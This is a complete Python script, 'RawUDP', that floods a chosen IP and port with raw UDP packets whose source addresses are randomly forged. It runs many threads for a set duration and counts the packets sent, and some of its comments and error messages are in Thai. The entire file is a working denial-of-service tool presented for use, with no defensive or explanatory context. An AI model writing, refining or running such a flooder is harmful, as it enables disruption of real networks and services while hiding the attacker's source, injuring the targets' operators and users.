#!/usr/bin/env python3
"""
RawUDP - Spoofed source IP UDP flooder
Usage: rawudp.py <IP> <PORT> [THREADS] [DURATION] [PACKET_SIZE]

Requires: root + CAP_NET_RAW
"""
import socket
import struct
import random
import threading
import time
import sys

if len(sys.argv) < 3:
    print("Usage: rawudp.py <IP> <PORT> [THREADS] [DURATION] [PKT]")
    sys.exit(1)

TARGET_IP   = sys.argv[1]
TARGET_PORT = int(sys.argv[2])
THREADS     = int(sys.argv[3]) if len(sys.argv) > 3 else 200
DURATION    = int(sys.argv[4]) if len(sys.argv) > 4 else 60
PACKET_SIZE = int(sys.argv[5]) if len(sys.argv) > 5 else 1400

TARGET_ADDR = socket.inet_aton(TARGET_IP)
threading.stack_size(256 * 1024)

total_sent = 0
lock = threading.Lock()


def random_ip():
    return "%d.%d.%d.%d" % (
        random.randint(1, 254),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254),
    )


def build_packet():
    src_ip   = random_ip()
    src_port = random.randint(1024, 65535)

    payload = random._urandom(PACKET_SIZE)

    ip_ver_ihl = 0x45
    ip_tos     = 0
    ip_len     = 20 + 8 + len(payload)
    ip_id      = random.randint(0, 65535)
    ip_frag    = 0
    ip_ttl     = random.randint(32, 255)
    ip_proto   = socket.IPPROTO_UDP
    ip_check   = 0
    ip_src     = socket.inet_aton(src_ip)

    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag,
        ip_ttl, ip_proto, ip_check, ip_src, TARGET_ADDR,
    )

    udp_len = 8 + len(payload)
    udp_header = struct.pack("!HHHH", src_port, TARGET_PORT, udp_len, 0)

    return ip_header + udp_header + payload


def flood(deadline):
    global total_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        # send buffer ใหญ่ → ลด syscall block
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
    except PermissionError:
        print("[RAWUDP] ERROR: ต้องรันเป็น root")
        sys.exit(1)
    except OSError as e:
        print(f"[RAWUDP] ERROR: {e} — VPS อาจไม่รองรับ raw socket")
        sys.exit(1)

    sent = 0
    while time.time() < deadline:
        try:
            sock.sendto(build_packet(), (TARGET_IP, 0))
            sent += 1
        except Exception:
            pass
        if sent % 5000 == 0:
            with lock:
                total_sent += sent
            sent = 0

    with lock:
        total_sent += sent
    try:
        sock.close()
    except Exception:
        pass


def main():
    deadline = time.time() + DURATION
    print(
        f"[RAWUDP] target={TARGET_IP}:{TARGET_PORT} "
        f"threads={THREADS} duration={DURATION}s pkt={PACKET_SIZE}B spoof=ON"
    )

    for _ in range(THREADS):
        t = threading.Thread(target=flood, args=(deadline,), daemon=True)
        t.start()

    try:
        while time.time() < deadline:
            time.sleep(1)
            with lock:
                print(f"[RAWUDP] sent={total_sent:,}", flush=True)
    except KeyboardInterrupt:
        pass
    print("[RAWUDP] done")


if __name__ == "__main__":
    main()